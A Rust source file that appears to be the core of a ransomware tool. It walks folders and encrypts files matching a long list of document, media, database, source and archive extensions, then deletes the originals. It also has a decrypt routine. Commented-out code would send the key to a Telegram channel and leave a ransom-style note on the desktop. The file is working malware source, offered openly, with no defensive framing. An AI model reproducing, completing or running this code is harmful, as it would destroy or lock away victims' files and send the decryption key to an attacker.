use std::path::Path;

use log::{debug, error};
use walkdir::WalkDir;

use crate::{
    args::{self, Args, SubCommand},
    crypto::{self, Crypto, Key},
};

const INTERESTING_EXTENSIONS: &'static [&'static str] = &[
    "doc", "docx", "msg", "odt", "wpd", "wps", "txt", // Text Files
    "csv", "pps", "ppt", "pptx", "iso", // Data files
    "aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma", // Audio Files
    "3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv", // Video Files
    "3dm", "3ds", "max", "obj", "blend", // 3D Image files
    "bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico", // Raster Image Files
    "ai", "eps", "ps", "svg", // Vector Image files
    "pdf", "indd", "pct", "epub", // Page Layout Files
    "xls", "xlr", "xlsx", // Spreadsheet Files
    "accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db", // Database Files
    "dem", "gam", "nes", "rom", "sav", // Game Files
    "bkp", "bak", "tmp", // Temp Files
    "cfg", "conf", "ini", "prf", "yml", "yaml", "toml", "json", // Config files
    "html", "php", "js", "c", "cc", "py", "lua", "go", "java", "rs", "ts", "tsx", "jsx",
    "rb", // Source files
    "asp", "aspx", "cer", "cfm", "cgi", "pl", "htm", "jsp", "part", "php", "rss",
    "xhtml", // Web files
    "zip", "rar", "tar", "gz", "7z", "pkg", "deb", "rpm", "zipx", // Compressed files
];

const FILTER_FILE_TYPE: fn(&walkdir::DirEntry) -> bool = |e| {
    // TODO Check whether there are writable folders deeper in the tree
    (e.file_type().is_dir()
        && e.metadata()
            .map(|m| !m.permissions().readonly())
            .unwrap_or_default())
        || e.file_type().is_file() // TODO Add support for symlinks because of evil reasons
};

const FILTER_INTERESTING_EXTENSIONS: fn(&walkdir::DirEntry) -> bool = |e| {
    INTERESTING_EXTENSIONS.contains(
        &e.path()
            .extension()
            .unwrap_or_default()
            .to_str()
            .unwrap_or_default(),
    )
};

const FILTER_ENCRYPTED_EXTENSIONS: fn(&walkdir::DirEntry) -> bool =
    |e| e.path().extension().unwrap_or_default() == crypto::ENCRYPTED_FILE_EXTENSION;

pub async fn run(args: Args) -> Result<(), anyhow::Error> {
    let Some(action) = args
        .subcommand
        .or_else(|| args::SubCommand::fuzzy_select().ok())
    else {
        return Ok(());
    };

    let _message = match action {
        SubCommand::Encrypt { input, key } => {
            let key = Key::get_or_new(key)?;
            walk_encrypt(&key, &input)?;
            hex::encode(key)
        }
        SubCommand::Decrypt { input, key } => {
            walk_decrypt(Key::get(key)?, &input)?;
            "Successfull decryption".to_string()
        }
    };

    // RendezVous::Telegram(
    //     args.bot_token
    //         .or_else(|| prompt("Bot token").ok())
    //         .expect("Bot token not provided"),
    //     args.channel_id.unwrap_or_else(|| {
    //         prompt("Channel ID")
    //             .expect("Channel ID not provided")
    //             .parse()
    //             .expect("Channel ID is not a number")
    //     }),
    // )
    // .send(&rendezvous::Data::Text(message))
    // .await
    // .map_err(|err| anyhow::anyhow!("Sending message: {}", err))?;

    Ok(())
}

fn walk_encrypt(key: &Key, path: &Path) -> Result<(), anyhow::Error> {
    debug!("Encryption started {:?}", path);
    for dir_entry in WalkDir::new(path)
        .into_iter()
        .filter_map(|e| {
            if let Err(e) = &e {
                error!("Walking {:?}: {}", path, e);
            }
            e.ok()
        })
        .filter(FILTER_FILE_TYPE)
        .filter(FILTER_INTERESTING_EXTENSIONS)
    {
        if let Err(e) = Crypto::encrypt(
            &key,
            &dir_entry.path(),
            format!(
                "{}.{}",
                dir_entry.path().display(),
                crypto::ENCRYPTED_FILE_EXTENSION
            )
            .as_ref(),
        ) {
            error!("Encrypting {:?}: {}", dir_entry.path(), e);
        } else {
            std::fs::remove_file(dir_entry.path())?;
        }
    }
    debug!("Encryption ended {:?}", path);
    Ok(())
}

fn walk_decrypt(key: Key, path: &Path) -> Result<(), anyhow::Error> {
    debug!("Decryption started {:?}", path);
    for dir_entry in WalkDir::new(path)
        .into_iter()
        .filter_map(|e| {
            if let Err(e) = &e {
                error!("Walking {:?}: {}", path, e);
            }
            e.ok()
        })
        .filter(FILTER_FILE_TYPE)
        .filter(FILTER_ENCRYPTED_EXTENSIONS)
    {
        if let Err(e) = Crypto::decrypt(
            &key,
            &dir_entry.path(),
            &dir_entry.path().with_extension(""),
        ) {
            error!("Decrypting {:?}: {}", dir_entry.path(), e);
        } else {
            std::fs::remove_file(dir_entry.path())?;
        }
    }
    debug!("Decryption ended {:?}", path);
    Ok(())
}

pub fn prompt(prompt: &str) -> Result<String, anyhow::Error> {
    dialoguer::Input::new()
        .with_prompt(prompt)
        .interact_text()
        .map(|s: String| s.trim().to_string())
        .map_err(|e| anyhow::anyhow!("Prompting failed: {e}"))
}

// fn _note(key: &Key) -> Result<(), anyhow::Error> {
//     let Some(desktop_path) = dirs_next::desktop_dir() else {
//         return Err(anyhow::anyhow!("Could not find desktop directory"));
//     };
//     std::fs::write(
//         desktop_path.join("note.txt"),
//         format!(
//             "This file contains the key to decrypt your files: {}",
//             hex::encode(key)
//         ),
//     )
//     .map_err(|err| anyhow::anyhow!("Writing note: {}", err))
// }
